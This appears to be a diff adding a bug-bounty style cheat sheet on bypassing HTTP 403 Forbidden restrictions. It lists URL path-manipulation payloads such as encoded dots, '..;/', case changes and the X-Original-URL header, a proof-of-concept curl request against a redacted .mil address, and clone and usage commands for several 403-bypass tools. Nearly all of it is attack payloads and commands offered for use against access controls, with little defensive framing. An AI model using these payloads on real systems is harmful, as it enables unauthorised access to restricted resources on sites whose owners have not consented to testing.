@@ -1,0 +1,72 @@
+For ex, if 
+example.com/admin = 403
+Then try
+
+example.com/%2e/admin
+example.com/admin..;/
+example.com/aDMin
+example.com/admin.
+example.com/admin/./
+
+Use can try "X-Original-URL"
+
+
+
+Proof-of-Concept
+For exploit write this command.
+Exploited command: curl -H "Content-Length:0" -X POST https://www.███████.mil/██████████
+Denied command: curl -X GET https://www.███████.mil/██████
+
+
+
+
+
+
+How to bypass an error 403 forbidden?
+The 403 Forbidden status indicates that the client was able to communicate with the server, but the server won't let the client access what was requested.
+I know that many things can trigger 403 errors like WAFs, IDS, supported .htcaccess file etc.
+and these are my approach and general methods to bypass it.
+
+>Fool the access control believe that a different approach was requested, by using "./" in the path of request or google more payload to bypass extension.
+> Use tools and extension such as https://github.com/smackerdodi/403bypasser
+https://github.com/sting8k/BurpSuite_403Bypasser
+
+
+
+BURP SUITE  403 Bypasser
+
+https://github.com/sting8k/BurpSuite_403Bypasser
+
+GitHub
+sting8k/BurpSuite_403Bypasser
+Burpsuite Extension to bypass 403 restricted directory - sting8k/BurpSuite_403Bypasser
+
+
+
+
+
+
+Tools git clone https://github.com/lobuhi/byp4xx.git
+
+./byp4xx.sh -c -r url
+
+
+
+tools https://github.com/yunemse48/403bypasser
+
+./bypass_403.sh -u <single_URL> -d <single_dir>
+./bypass_403.sh -U <path_of_URL_list> -D <path_of_dir_list>
+./bypass_403.sh -u <single_URL> -D <path_of_dir_list>
+./bypass_403.sh -U <path_of_URL_list> -d <single_dir>
+
+
+
+tools https://github.com/OdinF13/Bug-Bounty-Scripts.git
+
+bash sh_file url 
+
+
+
+
+
+https://shubs.io/enumerating-ips-in-x-forwarded-headers-to-bypass-403-restrictions/
